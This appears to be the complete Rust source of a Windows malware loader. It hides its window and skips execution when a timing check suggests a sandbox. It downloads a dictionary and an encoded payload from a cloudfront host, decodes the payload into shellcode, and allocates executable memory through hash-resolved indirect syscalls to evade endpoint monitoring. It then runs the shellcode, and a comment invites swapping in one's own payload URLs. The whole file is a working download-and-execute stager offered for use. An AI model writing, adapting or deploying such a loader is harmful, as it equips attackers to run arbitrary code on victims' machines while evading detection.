#![windows_subsystem = "windows"]

use std::collections::HashMap;
use std::error::Error;
use std::time::{Duration, Instant};

#[cfg(target_os = "windows")]
use std::{ptr, mem, arch::asm, ffi::CString};

#[cfg(target_os = "windows")]
use std::ffi::c_void;

#[allow(non_snake_case)]
mod win {
    use std::ffi::{c_void, c_char};
    
    pub const MEM_COMMIT: u32 = 0x1000;
    pub const MEM_RESERVE: u32 = 0x2000;
    pub const PAGE_READWRITE: u32 = 0x04;
    pub const PAGE_EXECUTE_READ: u32 = 0x20;
    
    pub const IMAGE_DIRECTORY_ENTRY_EXPORT: usize = 0;
    
    #[repr(C)]
    pub struct IMAGE_DOS_HEADER {
        pub e_magic: u16,
        pub e_cblp: u16,
        pub e_cp: u16,
        pub e_crlc: u16,
        pub e_cparhdr: u16,
        pub e_minalloc: u16,
        pub e_maxalloc: u16,
        pub e_ss: u16,
        pub e_sp: u16,
        pub e_csum: u16,
        pub e_ip: u16,
        pub e_cs: u16,
        pub e_lfarlc: u16,
        pub e_ovno: u16,
        pub e_res: [u16; 4],
        pub e_oemid: u16,
        pub e_oeminfo: u16,
        pub e_res2: [u16; 10],
        pub e_lfanew: i32,
    }
    
    #[repr(C)]
    pub struct IMAGE_DATA_DIRECTORY {
        pub VirtualAddress: u32,
        pub Size: u32,
    }
    
    #[repr(C)]
    pub struct IMAGE_OPTIONAL_HEADER64 {
        pub Magic: u16,
        pub MajorLinkerVersion: u8,
        pub MinorLinkerVersion: u8,
        pub SizeOfCode: u32,
        pub SizeOfInitializedData: u32,
        pub SizeOfUninitializedData: u32,
        pub AddressOfEntryPoint: u32,
        pub BaseOfCode: u32,
        pub ImageBase: u64,
        pub SectionAlignment: u32,
        pub FileAlignment: u32,
        pub MajorOperatingSystemVersion: u16,
        pub MinorOperatingSystemVersion: u16,
        pub MajorImageVersion: u16,
        pub MinorImageVersion: u16,
        pub MajorSubsystemVersion: u16,
        pub MinorSubsystemVersion: u16,
        pub Win32VersionValue: u32,
        pub SizeOfImage: u32,
        pub SizeOfHeaders: u32,
        pub CheckSum: u32,
        pub Subsystem: u16,
        pub DllCharacteristics: u16,
        pub SizeOfStackReserve: u64,
        pub SizeOfStackCommit: u64,
        pub SizeOfHeapReserve: u64,
        pub SizeOfHeapCommit: u64,
        pub LoaderFlags: u32,
        pub NumberOfRvaAndSizes: u32,
        pub DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
    }
    
    #[repr(C)]
    pub struct IMAGE_FILE_HEADER {
        pub Machine: u16,
        pub NumberOfSections: u16,
        pub TimeDateStamp: u32,
        pub PointerToSymbolTable: u32,
        pub NumberOfSymbols: u32,
        pub SizeOfOptionalHeader: u16,
        pub Characteristics: u16,
    }
    
    #[repr(C)]
    pub struct IMAGE_NT_HEADERS64 {
        pub Signature: u32,
        pub FileHeader: IMAGE_FILE_HEADER,
        pub OptionalHeader: IMAGE_OPTIONAL_HEADER64,
    }
    
    #[repr(C)]
    pub struct IMAGE_EXPORT_DIRECTORY {
        pub Characteristics: u32,
        pub TimeDateStamp: u32,
        pub MajorVersion: u16,
        pub MinorVersion: u16,
        pub Name: u32,
        pub Base: u32,
        pub NumberOfFunctions: u32,
        pub NumberOfNames: u32,
        pub AddressOfFunctions: u32,
        pub AddressOfNames: u32,
        pub AddressOfNameOrdinals: u32,
    }
    
    // FFI function declarations
    extern "system" {
        pub fn GetModuleHandleA(lpModuleName: *const c_char) -> *mut c_void;
        pub fn VirtualAlloc(
            lpAddress: *mut c_void,
            dwSize: usize,
            flAllocationType: u32,
            flProtect: u32,
        ) -> *mut c_void;
        pub fn VirtualProtect(
            lpAddress: *mut c_void,
            dwSize: usize,
            flNewProtect: u32,
            lpflOldProtect: *mut u32,
        ) -> i32;
    }
}

// Type alias for the shellcode function.
type ShellcodeFunc = unsafe extern "system" fn() -> i32;

// Dictionary-based decoder implementation.
struct Decoder {
    dictionary: HashMap<String, u8>,
}

impl Decoder {
    fn new(dictionary_text: &str) -> Self {
        let dictionary = dictionary_text
            .lines()
            .enumerate()
            .map(|(i, word)| (word.trim().to_string(), i as u8))
            .collect();

        Decoder { dictionary }
    }

    fn decode(&self, encoded: &str) -> Vec<u8> {
        encoded
            .split_whitespace()
            .filter_map(|word| {
                // Try to get from dictionary first
                if let Some(&byte) = self.dictionary.get(word) {
                    Some(byte)
                } else {
                    // If not in dictionary, try to parse as a number
                    word.parse::<u8>().ok()
                }
            })
            .collect()
    }
}

type HANDLE = isize;
type NTSTATUS = i32;

#[repr(C)]
struct SyscallInfo {
    ssn: u32,
    address: usize,
}

// Simple hash function for function names.
fn hash_function_name(name: &str) -> u32 {
    let mut hash: u32 = 0x35;
    for byte in name.bytes() {
        hash ^= byte as u32;
        hash = hash.rotate_left(13);
        hash = hash.wrapping_mul(7);
    }
    hash
}

#[cfg(target_os = "windows")]
unsafe fn get_syscall_info(function_hash: u32) -> Option<SyscallInfo> {
    let ntdll_name = CString::new("ntdll.dll").unwrap();
    let ntdll = win::GetModuleHandleA(ntdll_name.as_ptr());
    if ntdll.is_null() {
        return None;
    }
    let dos_header = ntdll as *const win::IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != 0x5A4D {
        return None;
    }
    let nt_headers = (ntdll as usize + (*dos_header).e_lfanew as usize) as *const win::IMAGE_NT_HEADERS64;
    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[win::IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    let export_dir = (ntdll as usize + export_dir_rva as usize) as *const win::IMAGE_EXPORT_DIRECTORY;
    let names = (ntdll as usize + (*export_dir).AddressOfNames as usize) as *const u32;
    let functions = (ntdll as usize + (*export_dir).AddressOfFunctions as usize) as *const u32;
    let ordinals = (ntdll as usize + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;

    for i in 0..(*export_dir).NumberOfNames {
        let name_rva = *names.add(i as usize);
        let name_ptr = (ntdll as usize + name_rva as usize) as *const i8;
        let function_name = std::ffi::CStr::from_ptr(name_ptr).to_string_lossy();
        if !function_name.starts_with("Nt") || function_name.starts_with("Ntdll") {
            continue;
        }
        if hash_function_name(&function_name) == function_hash {
            let ordinal = *ordinals.add(i as usize) as usize;
            let function_rva = *functions.add(ordinal);
            let function_addr = ntdll as usize + function_rva as usize;
            
            // Search for syscall pattern in a memory-safe way
            for offset in 0..20 {
                let byte_ptr = (function_addr + offset) as *const u8;
                // Safety: Use unaligned reads to check for the pattern
                if ptr::read_unaligned(byte_ptr) == 0xB8 {  // MOV EAX, imm32
                    let ssn = ptr::read_unaligned(byte_ptr.add(1) as *const u32);
                    
                    // Look for syscall instruction (0F 05)
                    for j in 5..15 {
                        let syscall_ptr = byte_ptr.add(j);
                        if ptr::read_unaligned(syscall_ptr) == 0x0F &&
                           ptr::read_unaligned(syscall_ptr.add(1)) == 0x05 {
                            return Some(SyscallInfo {
                                ssn,
                                address: syscall_ptr as usize,
                            });
                        }
                    }
                    
                    // Found the SSN but not the syscall instruction; fallback
                    return Some(SyscallInfo { ssn, address: function_addr });
                }
            }
        }
    }
    
    // Fallback values if resolution fails.
    match function_hash {
        0x12345678 => Some(SyscallInfo { ssn: 0x18, address: 0x7FFE0308 }),
        0x87654321 => Some(SyscallInfo { ssn: 0x50, address: 0x7FFE0320 }),
        _ => None,
    }
}

#[cfg(not(target_os = "windows"))]
unsafe fn get_syscall_info(_function_hash: u32) -> Option<SyscallInfo> {
    None
}

/// Performs a syscall with 6 parameters (e.g. NtAllocateVirtualMemory)
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn indirect_syscall_6(
    syscall_info: &SyscallInfo,
    a: usize,
    b: usize,
    c: usize,
    d: usize,
    e: usize,
    f: usize,
) -> NTSTATUS {
    let status: NTSTATUS;
    if syscall_info.address != 0 {
        asm!(
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "syscall",
            ssn = in(reg) syscall_info.ssn,
            in("rcx") a,
            in("rdx") b,
            in("r8") c,
            in("r9") d,
            in("r12") e,
            in("r13") f,
            lateout("rax") status,
        );
    } else {
        status = -1; // STATUS_UNSUCCESSFUL
    }
    status
}

/// Performs a syscall with 5 parameters (e.g. NtProtectVirtualMemory)
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn indirect_syscall_5(
    syscall_info: &SyscallInfo,
    a: usize,
    b: usize,
    c: usize,
    d: usize,
    e: usize,
) -> NTSTATUS {
    let status: NTSTATUS;
    if syscall_info.address != 0 {
        asm!(
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "syscall",
            ssn = in(reg) syscall_info.ssn,
            in("rcx") a,
            in("rdx") b,
            in("r8") c,
            in("r9") d,
            in("r12") e,
            lateout("rax") status,
        );
    } else {
        status = -1; // STATUS_UNSUCCESSFUL
    }
    status
}

/// Fallback: Allocates memory using VirtualAlloc
#[cfg(target_os = "windows")]
unsafe fn virtual_alloc_ex(size: usize) -> (*mut c_void, bool) {
    let buffer = win::VirtualAlloc(
        ptr::null_mut(),
        size,
        win::MEM_COMMIT | win::MEM_RESERVE,
        win::PAGE_READWRITE,
    );
    (buffer, !buffer.is_null())
}

#[cfg(not(target_os = "windows"))]
unsafe fn virtual_alloc_ex(_size: usize) -> (*mut std::ffi::c_void, bool) {
    (std::ptr::null_mut(), false)
}

#[cfg(target_os = "windows")]
unsafe fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn Error>> {
    let size = shellcode.len();
    let mut buffer: *mut c_void = ptr::null_mut();
    let mut use_syscall = false;

    // Try to allocate memory using indirect syscall (only on x86_64)
    #[cfg(target_arch = "x86_64")]
    {
        let nt_alloc_hash = hash_function_name("NtAllocateVirtualMemory");
        if let Some(alloc_info) = get_syscall_info(nt_alloc_hash).or_else(|| get_syscall_info(0x12345678)) {
            let handle: HANDLE = -1;
            let mut base_address = ptr::null_mut::<c_void>() as usize;
            let base_address_ptr = &mut base_address as *mut usize;
            let mut region_size = size;
            let region_size_ptr = &mut region_size as *mut usize;
            
            let allocation_type = (win::MEM_COMMIT | win::MEM_RESERVE) as usize;
            let protection = win::PAGE_READWRITE as usize;
            
            let status = indirect_syscall_6(
                &alloc_info,
                handle as usize,
                base_address_ptr as usize,
                0usize, // ZeroBits
                region_size_ptr as usize,
                allocation_type,
                protection,
            );
            
            if status == 0 {
                use_syscall = true;
                buffer = base_address as *mut c_void;
            }
        }
    }

    // Fallback to VirtualAlloc if syscall fails or not available
    if !use_syscall || buffer.is_null() {
        let (alloc_buffer, success) = virtual_alloc_ex(size);
        if !success {
            return Err("Memory allocation failed using both syscall and VirtualAlloc".into());
        }
        buffer = alloc_buffer;
        use_syscall = false;
    }

    // Add null check before copying
    if buffer.is_null() {
        return Err("Failed to allocate memory for shellcode".into());
    }

    // Copy shellcode to allocated memory
    ptr::copy_nonoverlapping(shellcode.as_ptr(), buffer as *mut u8, size);

    // Change memory protection to executable.
    let mut protection_changed = false;
    
    #[cfg(target_arch = "x86_64")]
    if use_syscall {
        let nt_protect_hash = hash_function_name("NtProtectVirtualMemory");
        if let Some(protect_info) = get_syscall_info(nt_protect_hash).or_else(|| get_syscall_info(0x87654321)) {
            let handle: HANDLE = -1;
            let mut base_address = buffer as usize;
            let base_address_ptr = &mut base_address as *mut usize;
            let mut region_size = size;
            let region_size_ptr = &mut region_size as *mut usize;
            let mut old_protect = 0usize;
            let old_protect_ptr = &mut old_protect as *mut usize;
            
            let status = indirect_syscall_5(
                &protect_info,
                handle as usize,
                base_address_ptr as usize,
                region_size_ptr as usize,
                win::PAGE_EXECUTE_READ as usize,
                old_protect_ptr as usize,
            );
            
            protection_changed = status == 0;
        }
    }
    
    // Fallback to VirtualProtect if syscall fails or not available
    if !protection_changed {
        let mut old_protect = 0u32;
        if win::VirtualProtect(buffer, size, win::PAGE_EXECUTE_READ, &mut old_protect) == 0 {
            return Err("Memory protection change failed".into());
        }
    }

    // Create a function pointer from the allocated memory and execute the shellcode.
    let shellcode_func: ShellcodeFunc = mem::transmute(buffer);
    shellcode_func();

    Ok(())
}

fn detect_analysis_environment() -> bool {
    let start = Instant::now();
    std::thread::sleep(Duration::from_millis(500));
    let elapsed = start.elapsed();
    elapsed.as_millis() < 450 || elapsed.as_millis() > 550
}

#[allow(dead_code)]
fn deobfuscate(bytes: &[u8]) -> String {
    bytes.iter().map(|&b| (b ^ 0x41) as char).collect()
}

// URLs for content retrieval - prioritized source
// Change URLS to your payload and dictionary URLs
const DICTIONARY_URL: &str = "https://d3d6t1tuvmlrp2.cloudfront.net/es-dictionary.txt"; 
const PAYLOAD_URL: &str = "https://d3d6t1tuvmlrp2.cloudfront.net/loads.txt";


// Enhanced download function that prioritizes URLs from within the executable
fn download_with_retries(client: &reqwest::blocking::Client, url: &str, retries: u8) -> Result<String, Box<dyn Error>> {
    for attempt in 1..=retries {
        match client.get(url).send() {
            Ok(response) => {
                if response.status().is_success() {
                    match response.text() {
                        Ok(text) if !text.is_empty() => {
                            return Ok(text);
                        },
                        Ok(_) => {
                            // Empty response - continue to retry
                        },
                        Err(e) => {
                            if attempt == retries {
                                return Err(format!("Failed to extract text from response: {}", e).into());
                            }
                        }
                    }
                } else {
                    if attempt == retries {
                        return Err(format!("Failed with status code: {}", response.status()).into());
                    }
                }
            }
            Err(e) => {
                if attempt == retries {
                    return Err(format!("Failed to retrieve {} after {} attempts: {}", url, retries, e).into());
                }
            }
        }
        if attempt < retries {
            std::thread::sleep(Duration::from_secs(2));
        }
    }
    Err(format!("Failed to retrieve {} after {} attempts", url, retries).into())
}

fn main() -> Result<(), Box<dyn Error>> {
    if detect_analysis_environment() {
        return Ok(());
    }
    
    let client = reqwest::blocking::ClientBuilder::new()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .timeout(Duration::from_secs(30))
        .connect_timeout(Duration::from_secs(10))
        .build()?;

    // Download dictionary from URL
    let dictionary_text = match download_with_retries(&client, DICTIONARY_URL, 3) {
        Ok(text) => text,
        Err(e) => {
            return Err(format!("Dictionary retrieval failed: {}", e).into());
        }
    };
    
    if dictionary_text.is_empty() {
        return Err("Retrieved empty dictionary".into());
    }
    
    let decoder = Decoder::new(&dictionary_text);
    
    // Download payload from URL
    let encoded_payload = match download_with_retries(&client, PAYLOAD_URL, 3) {
        Ok(text) => text,
        Err(e) => {
            return Err(format!("Payload retrieval failed: {}", e).into());
        }
    };
    
    if encoded_payload.is_empty() {
        return Err("Retrieved empty payload".into());
    }

    let shellcode = decoder.decode(&encoded_payload);
    if shellcode.is_empty() {
        return Err("Payload is empty. Check dictionary and encoded content".into());
    }

    #[cfg(target_os = "windows")]
    {
        unsafe {
            match execute_shellcode(&shellcode) {
                Ok(_) => {},
                Err(e) => {
                    return Err(format!("Shellcode execution failed: {}", e).into());
                }
            }
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        // Silent operation on non-Windows systems
    }

    Ok(())
}
